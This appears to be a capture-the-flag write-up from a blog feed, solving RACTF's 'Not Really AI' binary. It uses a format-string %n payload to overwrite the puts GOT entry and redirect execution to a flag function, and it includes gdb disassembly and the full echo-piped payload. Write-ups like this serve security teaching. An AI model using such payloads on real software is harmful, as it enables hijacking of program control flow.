<p>Our approach to this challenge will be through overwriting the &ldquo;Global Offset Table&rdquo;&hellip;
to put it simply, the Global Offset Table is somewhere in the bss section of the binary where shared library functions are mapped to their addresses.
If we can overwrite one of these function addresses (for example <code>puts()</code> GOT address) then, when we want to execute this function (the <code>puts</code>) it will instead execute our arbitary function.</p>
<p>we check our vulnrable function for candiadtes:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">gef<span style="color:#960050;background-color:#1e0010">➤</span>  disas response 
Dump of assembler code <span style="color:#66d9ef">for</span> function response:
   <span style="color:#ae81ff">0x080491c2</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">0</span><span style="color:#f92672">&gt;:</span>     push   ebp
   <span style="color:#ae81ff">0x080491c3</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">1</span><span style="color:#f92672">&gt;:</span>     mov    ebp,esp
   <span style="color:#ae81ff">0x080491c5</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">3</span><span style="color:#f92672">&gt;:</span>     push   ebx
   <span style="color:#ae81ff">0x080491c6</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">4</span><span style="color:#f92672">&gt;:</span>     sub    esp,<span style="color:#ae81ff">0x204</span>
   <span style="color:#ae81ff">0x080491cc</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">10</span><span style="color:#f92672">&gt;:</span>    call   <span style="color:#ae81ff">0x8049100</span> <span style="color:#f92672">&lt;</span>__x86.get_pc_thunk.bx<span style="color:#f92672">&gt;</span>
   <span style="color:#ae81ff">0x080491d1</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">15</span><span style="color:#f92672">&gt;:</span>    add    ebx,<span style="color:#ae81ff">0x2e2f</span>
   <span style="color:#ae81ff">0x080491d7</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">21</span><span style="color:#f92672">&gt;:</span>    sub    esp,<span style="color:#ae81ff">0xc</span>
   <span style="color:#ae81ff">0x080491da</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">24</span><span style="color:#f92672">&gt;:</span>    lea    eax,[ebx<span style="color:#f92672">-</span><span style="color:#ae81ff">0x1ff8</span>]
   <span style="color:#ae81ff">0x080491e0</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">30</span><span style="color:#f92672">&gt;:</span>    push   eax
   <span style="color:#ae81ff">0x080491e1</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">31</span><span style="color:#f92672">&gt;:</span>    call   <span style="color:#ae81ff">0x8049060</span> <span style="color:#f92672">&lt;</span>puts<span style="color:#960050;background-color:#1e0010">@</span>plt<span style="color:#f92672">&gt;</span>
   <span style="color:#ae81ff">0x080491e6</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">36</span><span style="color:#f92672">&gt;:</span>    add    esp,<span style="color:#ae81ff">0x10</span>
   <span style="color:#ae81ff">0x080491e9</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">39</span><span style="color:#f92672">&gt;:</span>    mov    eax,DWORD PTR [ebx<span style="color:#f92672">-</span><span style="color:#ae81ff">0x8</span>]
   <span style="color:#ae81ff">0x080491ef</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">45</span><span style="color:#f92672">&gt;:</span>    mov    eax,DWORD PTR [eax]
   <span style="color:#ae81ff">0x080491f1</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">47</span><span style="color:#f92672">&gt;:</span>    sub    esp,<span style="color:#ae81ff">0x4</span>
   <span style="color:#ae81ff">0x080491f4</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">50</span><span style="color:#f92672">&gt;:</span>    push   eax
   <span style="color:#ae81ff">0x080491f5</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">51</span><span style="color:#f92672">&gt;:</span>    push   <span style="color:#ae81ff">0x200</span>
   <span style="color:#ae81ff">0x080491fa</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">56</span><span style="color:#f92672">&gt;:</span>    lea    eax,[ebp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x208</span>]
   <span style="color:#ae81ff">0x08049200</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">62</span><span style="color:#f92672">&gt;:</span>    push   eax
   <span style="color:#ae81ff">0x08049201</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">63</span><span style="color:#f92672">&gt;:</span>    call   <span style="color:#ae81ff">0x8049040</span> <span style="color:#f92672">&lt;</span>fgets<span style="color:#960050;background-color:#1e0010">@</span>plt<span style="color:#f92672">&gt;</span>
   <span style="color:#ae81ff">0x08049206</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">68</span><span style="color:#f92672">&gt;:</span>    add    esp,<span style="color:#ae81ff">0x10</span>
   <span style="color:#ae81ff">0x08049209</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">71</span><span style="color:#f92672">&gt;:</span>    sub    esp,<span style="color:#ae81ff">0xc</span>
   <span style="color:#ae81ff">0x0804920c</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">74</span><span style="color:#f92672">&gt;:</span>    lea    eax,[ebx<span style="color:#f92672">-</span><span style="color:#ae81ff">0x1fdd</span>]
   <span style="color:#ae81ff">0x08049212</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">80</span><span style="color:#f92672">&gt;:</span>    push   eax
   <span style="color:#ae81ff">0x08049213</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">81</span><span style="color:#f92672">&gt;:</span>    call   <span style="color:#ae81ff">0x8049060</span> <span style="color:#f92672">&lt;</span>puts<span style="color:#960050;background-color:#1e0010">@</span>plt<span style="color:#f92672">&gt;</span>
   <span style="color:#ae81ff">0x08049218</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">86</span><span style="color:#f92672">&gt;:</span>    add    esp,<span style="color:#ae81ff">0x10</span>
   <span style="color:#ae81ff">0x0804921b</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">89</span><span style="color:#f92672">&gt;:</span>    sub    esp,<span style="color:#ae81ff">0xc</span>
   <span style="color:#ae81ff">0x0804921e</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">92</span><span style="color:#f92672">&gt;:</span>    lea    eax,[ebp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x208</span>]
   <span style="color:#ae81ff">0x08049224</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">98</span><span style="color:#f92672">&gt;:</span>    push   eax
   <span style="color:#ae81ff">0x08049225</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">99</span><span style="color:#f92672">&gt;:</span>    call   <span style="color:#ae81ff">0x8049030</span> <span style="color:#f92672">&lt;</span>printf<span style="color:#960050;background-color:#1e0010">@</span>plt<span style="color:#f92672">&gt;</span>
   <span style="color:#ae81ff">0x0804922a</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">104</span><span style="color:#f92672">&gt;:</span>   add    esp,<span style="color:#ae81ff">0x10</span>
   <span style="color:#ae81ff">0x0804922d</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">107</span><span style="color:#f92672">&gt;:</span>   sub    esp,<span style="color:#ae81ff">0xc</span>
   <span style="color:#ae81ff">0x08049230</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">110</span><span style="color:#f92672">&gt;:</span>   lea    eax,[ebx<span style="color:#f92672">-</span><span style="color:#ae81ff">0x1fcf</span>]
   <span style="color:#ae81ff">0x08049236</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">116</span><span style="color:#f92672">&gt;:</span>   push   eax
   <span style="color:#ae81ff">0x08049237</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">117</span><span style="color:#f92672">&gt;:</span>   call   <span style="color:#ae81ff">0x8049060</span> <span style="color:#f92672">&lt;</span>puts<span style="color:#960050;background-color:#1e0010">@</span>plt<span style="color:#f92672">&gt;</span>
   <span style="color:#ae81ff">0x0804923c</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">122</span><span style="color:#f92672">&gt;:</span>   add    esp,<span style="color:#ae81ff">0x10</span>
   <span style="color:#ae81ff">0x0804923f</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">125</span><span style="color:#f92672">&gt;:</span>   nop
   <span style="color:#ae81ff">0x08049240</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">126</span><span style="color:#f92672">&gt;:</span>   mov    ebx,DWORD PTR [ebp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x4</span>]
   <span style="color:#ae81ff">0x08049243</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">129</span><span style="color:#f92672">&gt;:</span>   leave  
   <span style="color:#ae81ff">0x08049244</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">130</span><span style="color:#f92672">&gt;:</span>   ret    
End of assembler dump.
</code></pre></div><p>we see a <code>puts</code> call after the vulnerable <code>printf</code> function, that&rsquo;s our candiadte.
Alright, now it&rsquo;s time to collect all the pieces of the puzzle.</p>
<p>In order to start writing our exploit, we will need two pieces of information:</p>
<ol>
<li>The memory address we are overwriting &ndash;&gt; puts GOT address</li>
<li>The memory address we are overwriting with &ndash;&gt; flaggy</li>
</ol>
<p>to get the puts GOT address we can disassemble the puts address located at response&lt;+117&gt;:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">gef<span style="color:#960050;background-color:#1e0010">➤</span>  disas <span style="color:#ae81ff">0x8049060</span>
Dump of assembler code <span style="color:#66d9ef">for</span> function puts<span style="color:#960050;background-color:#1e0010">@</span>plt:
   <span style="color:#ae81ff">0x08049060</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">0</span><span style="color:#f92672">&gt;:</span>     jmp    DWORD PTR ds:<span style="color:#ae81ff">0x804c018</span>
   <span style="color:#ae81ff">0x08049066</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">6</span><span style="color:#f92672">&gt;:</span>     push   <span style="color:#ae81ff">0x18</span>
   <span style="color:#ae81ff">0x0804906b</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">11</span><span style="color:#f92672">&gt;:</span>    jmp    <span style="color:#ae81ff">0x8049020</span>
End of assembler dump.
</code></pre></div><p>then we examine the destination address of the jump instrcution above to make sure its the GOT address:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">gef<span style="color:#960050;background-color:#1e0010">➤</span>  x <span style="color:#ae81ff">0x804c018</span>
<span style="color:#ae81ff">0x804c018</span> <span style="color:#f92672">&lt;</span>puts<span style="color:#960050;background-color:#1e0010">@</span>got.plt<span style="color:#f92672">&gt;:</span>       <span style="color:#ae81ff">0x08049066</span>
</code></pre></div><p>and voila, <code>0x804c018</code> is our desired address!</p>
<p>now we need the flaggy function address:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">gef<span style="color:#960050;background-color:#1e0010">➤</span>  x flaggy
<span style="color:#ae81ff">0x8049245</span> <span style="color:#f92672">&lt;</span>flaggy<span style="color:#f92672">&gt;:</span>     <span style="color:#ae81ff">0x53e58955</span>
</code></pre></div><p>and our address is <code>0x8049245</code>
(note: don&rsquo;t confuse the address with its value, i.e: in the above snippet we have two hex numbers where <code>0x8049245</code> is the address/pointer and <code>0x53e58955</code> is the value of that pointer/address)</p>
<h3 id="time-to-write-our-exploit">Time to write our Exploit!</h3>
<p>our exploit will look like this (Abstracted):
<code>[Address_of_puts][Address_of_flaggy][Address_of_puts entry number on the stack]</code>
let&rsquo;s dig a bit deeper into each of these parts:</p>
<hr>
<ol>
<li><code>[Address_of_puts]:</code>
this is the simplest of the three, and it&rsquo;s basically our GOT puts address which we obtained above, but encoded in little endian</li>
</ol>
<pre><code>Address_of_puts = \x18\xc0\x04\x08 
</code></pre><hr>
<ol start="2">
<li><code>[Address_of_flaggy]:</code>
if we recall back, we mentioned that the %n specifier will write the printed character length to a specified pointer.
our goal here is to encode the Address of flaggy function as a padded address, for example we want to encode this address <code>0x8049245</code>
the format will be: <code>%(integer value of the address - 4)x</code> where the 4 is the length of the [Address_of_puts]
using any calculator or just python, we can calculate the integer value of any hex address:</li>
</ol>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">&gt;&gt;&gt;</span> int(<span style="color:#ae81ff">0x8049245</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">4</span>)
<span style="color:#ae81ff">134517313</span>
</code></pre></div><p>so our final payload will be: <code>%134517313x</code></p>
<hr>
<ol start="3">
<li><code>[Address_of_puts entry number on the stack]:</code>
to calculate the offset of puts in our printf stack leak, we use an Egg i.e: AAAA, and follow it with some <code>%x</code>'s until we can locate it&rsquo;s offset.</li>
</ol>
<pre><code>hegz@hegzbox:~/ractf/Not_Really_AI$ ./nra 
How are you finding RACTF?
AAAA %x %x %x %x %x %x %x %x
I am glad you
AAAA 200 f7fb9580 80491d1 41414141 20782520 25207825 78252078 20782520
</code></pre><p>we see that our offset is the 4th entry after the egg, so our payload will be: <code>%x %x %x %n</code> or we can use the special feautre of printf <code>%4$n</code> which does the same thing.</p>
<hr>
<p>full payload:
<code>\x18\xc0\x04\x08%134517313x%4$n</code></p>
<p>we will use echo to print and pipe it to the binary (we also escape the $ and append a \x0a for a newline):
<code>echo -en \x18\xc0\x04\x08%134517313x%4\\$n\x0a | ./nra</code>
a lot of blank spaces will be printed, and eventually our flag&hellip;
<code>ractf{f0rmat_Str1nG_fuN}</code></p>
]]></content>
        </item>
        
    </channel>
</rss>
